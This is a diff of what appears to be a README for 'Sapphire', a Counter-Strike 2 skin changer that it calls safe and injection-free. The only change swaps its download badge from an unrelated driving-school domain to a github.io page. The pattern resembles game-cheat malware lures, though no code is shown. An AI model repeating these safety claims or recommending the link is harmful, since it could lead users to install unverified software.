@@ -4,7 +4,7 @@
 
 This tool doesn’t modify your files or require any risky injection. Instead, it works as an intelligent skin overlay system that enables you to preview and play with custom visuals live in-game. Sapphire is also ideal for testing skin combos before investing on the Steam Market or third-party trading platforms.
 
-[![Download Sapphire](https://img.shields.io/badge/Download-Sapphire-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Sapphire](https://img.shields.io/badge/Download-Sapphire-blueviolet)](https://sapphire-cs2-skinchanger.github.io/.github)
 
 ---
 
